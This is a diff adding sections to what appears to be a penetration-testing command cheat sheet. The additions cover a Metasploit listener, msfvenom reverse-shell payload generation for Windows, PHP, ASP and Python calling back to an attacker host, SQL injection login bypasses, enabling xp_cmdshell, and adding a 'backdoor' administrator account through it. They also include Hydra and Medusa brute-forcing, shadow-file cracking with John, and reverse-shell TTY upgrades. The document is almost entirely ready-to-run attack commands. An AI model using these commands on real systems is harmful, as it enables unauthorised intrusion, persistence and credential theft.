@@ -166,3 +166,101 @@ tcpdump -i eth0 -XX -w output.pcap
 PSexec
 ======
 psexec /accepteula \\192.168.1.1 -u domain\admin -p password -c -f \\192.168.1.1\share\file.exe
+
+
+Metasploit & msfvenom
+=====================
+Multihandler Listener
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.10.1
+set lport 4444
+set ExitOnSession false
+exploit -j
+
+List all available payloads
+msfvenom --list payloads
+
+Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe > reversetcpshell.exe
+
+PHP (remember to edit the php edit after generating)
+msfvenom -p php/reverse_php LHOST=10.10.10.1 LPORT=4444 -f raw > phpreverseshell.php
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw > reverseshell.php
+cat reverseshell.php | pbcopy && echo '<?php ' | tr -d '\n' > reverseshell.php && pbpaste >> reverseshell.php
+
+ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f asp > aspshell.asp
+
+Python shell
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.1 LPORT=4444 -f raw > pyshell.py
+
+
+SQL injection
+=============
+Login Pages
+' or '1'='1
+or 1=1;
+" or ""="
+
+MSSQL command execution
+EXEC sp_configure 'show advanced options', 1;
+GO
+Reconfigure;
+GO
+EXEC sp_configure 'xp_cmdshell', 1;
+GO
+Reconfigure;
+GO
+
+Nmap usage
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="EXEC xp_cmdshell 'dir *.exe';" 10.10.10.1
+nmap -vv -sV -Pn -p 1433 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=%s,smsql.username-sa,mssql.password-poiuytrewq 10.10.10.1
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="ipconfig /all" 10.10.10.1
+
+SQSH db login
+sqsh -S 10.10.10.1 -U sa -P poiuytrewq -D database
+
+Using XP_cmdshell to gain administrator privileges by adding user
+add user
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<username>,mssql.password=<password>,ms-sql-xp-cmdshell.cmd="net user backdoor backdoor123 /add" 10.11.1.31
+add user to administrator group
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<username>,mssql.password=<password>,ms-sql-xp-cmdshell.cmd="net localgroup administrators backdoor /add" 10.11.1.31
+then proceed to rdp in or login via cmd line.
+
+
+Password Cracking
+=================
+Hydra commands
+hydra -t 4 -l admin -P ./rockyou.txt -vV 10.10.10.1 ftp
+hydra 10.10.10.1 -s 22 ssh -l admin -P ./rockyou.txt
+
+Unshadowing password
+sudo unshadow passwd.txt shadow.txt > crackthis.txt
+john --wordlist=/usr/share/seclists/rockyou.txt crackthis.txt
+
+Medusa
+medusa -h 10.10.10.1 -u admin -P password-file.txt -M http -m DIR:/admin -T 10 
+medusa -h 10.10.10.1 -p admin -U user-file.txt -M http -m DIR:/admin -T 10
+
+
+Interactive Shell/Escaping Shell
+================================
+Spawn TTY shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+sTTY options
+#In reverse shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+Ctrl-Z
+
+#In Kali
+stty raw -echo
+fg
+
+#in Reverse shell
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty row <num> columns <cols>
